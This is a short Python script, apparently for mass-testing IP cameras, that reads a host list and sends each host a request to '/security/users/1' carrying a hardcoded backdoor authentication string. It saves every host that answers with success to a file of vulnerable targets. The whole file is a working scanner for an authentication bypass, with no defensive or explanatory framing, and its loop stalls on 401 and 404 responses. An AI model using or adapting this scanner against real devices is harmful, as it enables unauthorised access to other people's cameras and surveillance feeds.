import os , sys , requests
from host import host
class hikTester:
    def hikTester(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        up_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        BackdoorAuthArg = "auth=YWRtaW46MTEK"
        p = 0
        while p < len(up_host):
            try:
                res = up_host[p]
                address = host.Host.addressRegex(res)
                percentage = (p / len(up_host)) * 100
                progressBar = int(percentage)/5
                sys.stdout.write("\r" + "[...] Loading   [%-20s] %.2f%%" % ('█' * int(progressBar), percentage))
                sys.stdout.flush()
                response = requests.get('http://' + address['ip'] + ':' + str(address['port']) + '/security/users/1?' + BackdoorAuthArg)
                if response.status_code == 200:
                    with open(path + '/host/vuln_host.txt', 'a') as host_vuln:
                        host_vuln.write(address['ip']+ ':' + str(address['port']) + "\n")
                elif response.status_code == 401:
                    pass
                elif response.status_code == 404:
                    pass
                p += 1
            except requests.exceptions.ConnectionError:
                pass
                p += 1
            except requests.exceptions.InvalidURL:
                pass
                p += 1
        sys.stdout.write("\r" + "[!!!] Complete [%-20s] %.2f%%" % ('█' * 20, 100.00))